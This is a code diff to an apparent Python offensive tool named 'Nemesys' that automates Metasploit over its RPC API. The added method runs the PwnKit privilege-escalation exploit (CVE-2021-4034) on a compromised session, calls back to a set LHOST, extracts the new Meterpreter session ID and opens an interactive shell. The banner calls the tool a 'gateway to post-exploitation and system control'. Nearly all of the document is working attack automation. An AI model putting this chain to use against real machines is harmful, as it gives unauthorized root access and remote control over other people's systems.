@@ -45,7 +45,7 @@ class Nemesys:
             session_id = self._get_session_id(exploit_uuid)
             if session_id:
                 new_session_id = self._upgrade_session(int(session_id))
-                ##self.post_explotation(int(session_id) + 1)
+                new_session_id = self._perform_privilege_escalation(new_session_id)
                 ##self._enumerate_system(session_id)
                 self._open_shell(new_session_id)
             else:
@@ -114,31 +114,64 @@ class Nemesys:
 
         return new_session_id
 
-    def post_explotation(self, session_id):
-        """Realiza acciones de post-explotación, recogiendo información relevante.
+    def _perform_privilege_escalation(self, session_id):
+        """
+        Executes a local privilege escalation exploit and attempts to retrieve the new Meterpreter session ID.
 
         Args:
-            client (MsfRpcClient): Cliente de Metasploit.
-            session_id (int): ID de la sesión activa.
+            session_id (int): ID of the current session.
 
         Returns:
-            None: Los resultados se imprimen directamente en la consola.
+            int: New Meterpreter session ID if escalation is successful, None otherwise.
         """
         console_id = self.client.consoles.console().cid
-        #exploit_module = '/linux/local/ufo_privilege_escalation'
-        #exploit_module = 'linux/local/overlayfs_priv_esc'
         exploit_module = 'linux/local/cve_2021_4034_pwnkit_lpe_pkexec'
-        self.client.consoles.console(console_id).write(f'use {exploit_module}\n')
-        self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
-        #self.client.consoles.console(console_id).write('set verbose true\n')
-        self.client.consoles.console(console_id).write('set LHOST 192.168.11.129\n')
-        self.client.consoles.console(console_id).write('run\n')
+        new_session_id = None
 
-        time.sleep(60)
-        output = self.client.consoles.console(console_id).read()
-        print("Resultados obtenidos del módulo:")
-        print(output['data'])
-        self.client.consoles.console(console_id).destroy()
+        try:
+            logger.info("🚀 Starting privilege escalation using PwnKit (CVE-2021-4034)...")
+            logger.debug(f"🔍 Using exploit module: {exploit_module}")
+
+            # Configure the exploit module
+            self.client.consoles.console(console_id).write(f'use {exploit_module}\n')
+            self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
+            self.client.consoles.console(console_id).write('set LHOST 192.168.11.129\n')
+
+            logger.info("🔧 Executing the privilege escalation module...")
+            self.client.consoles.console(console_id).write('run\n')
+
+            # Wait for the module to execute
+            time.sleep(30)
+
+            # Read the console output
+            output = self.client.consoles.console(console_id).read()
+            escalation_output = output.get('data', '')
+
+            # Check the output for a new Meterpreter session ID
+            if "Meterpreter session" in escalation_output:
+                # Extract the new session ID using a regular expression
+                match = re.search(r'Meterpreter session (\d+) opened', escalation_output)
+                if match:
+                    new_session_id = int(match.group(1))
+                    logger.info(f"✅ Privilege escalation successful! New Meterpreter session ID: {new_session_id}")
+                else:
+                    logger.warning("⚠️ Could not extract the new session ID from the output.")
+            elif "Post module execution completed" in escalation_output:
+                logger.info("✅ Privilege escalation module execution completed, but no new session ID found.")
+            elif "Exploit failed" in escalation_output or "No session was created" in escalation_output:
+                logger.error("❌ Privilege escalation failed: No Meterpreter session created.")
+            else:
+                logger.warning("⚠️ Unknown status. The privilege escalation process may not have completed as expected.")
+
+        except Exception as e:
+            logger.error(f"⚠️ Error during privilege escalation: {e}")
+
+        finally:
+            # Clean up the console session
+            self.client.consoles.console(console_id).destroy()
+            logger.info("🧹 Console session destroyed after privilege escalation attempt.")
+
+        return new_session_id
 
 
     def _run_exploit(self, exploit_name, payload_name, exploit_options, payload_options):
@@ -220,11 +253,11 @@ class Nemesys:
 
         banner = """
         ╔════════════════════════════════════════════════════════════╗
-        ║            💀 Welcome to the Nemesys Shell Interface 💀            ║
+        ║            💀 Welcome to the Nemesys Shell Interface 💀   ║
         ║────────────────────────────────────────────────────────────║
-        ║  ⚔️  Your gateway to post-exploitation and system control.   ║
-        ║  🔍  Type 'help' for available commands.                     ║
-        ║  🚪  Type 'exit' to leave the interactive session.           ║
+        ║  ⚔️  Your gateway to post-exploitation and system control.║
+        ║  🔍  Type 'help' for available commands.                   ║
+        ║  🚪  Type 'exit' to leave the interactive session.         ║
         ╚════════════════════════════════════════════════════════════╝
         """
 
